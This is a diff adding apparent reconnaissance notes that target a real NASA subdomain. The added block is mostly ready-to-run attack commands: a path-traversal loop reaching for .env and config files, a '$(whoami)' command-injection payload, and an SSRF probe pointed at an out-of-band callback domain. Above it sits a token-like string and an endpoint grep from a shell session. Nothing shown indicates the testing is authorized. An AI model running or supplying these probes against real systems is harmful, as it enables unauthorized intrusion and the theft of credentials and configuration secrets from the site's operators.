@@ -191,3 +191,27 @@ ajdev@rootbox:~/nassa$ grep -Eoi "(\/(api|v1|v2|internal|admin|auth|debug|handle
 
 eNvH/tpHuJOyzSBN8BmuWd8XIGLpcxBzr5YLp3OB21A
 ```
+
+
+```
+# 1. Check for common sensitive files at leaked path:
+for file in ".env" "config.js" "package.json" "web.config"; do
+  echo -n "Testing $file: "
+  curl -s -o /dev/null -w "%{http_code}" \
+    "https://sciencecareers.apps.nasa.gov/static/../../$file" 2>/dev/null
+  echo
+done
+
+# 2. Test for command injection in error handling (non-destructive):
+curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"test":"$(whoami)"}' \
+  https://sciencecareers.apps.nasa.gov/api/test 2>/dev/null | grep -i "root\|admin"
+
+# 3. Check for SSRF via error reflection:
+curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://YOUR_INTERACTSH_DOMAIN.burpcollaborator.net"}' \
+  https://sciencecareers.apps.nasa.gov/api/fetch 2>/dev/null
+# Then check your Interactsh/Burp Collaborator for callbacks
+```
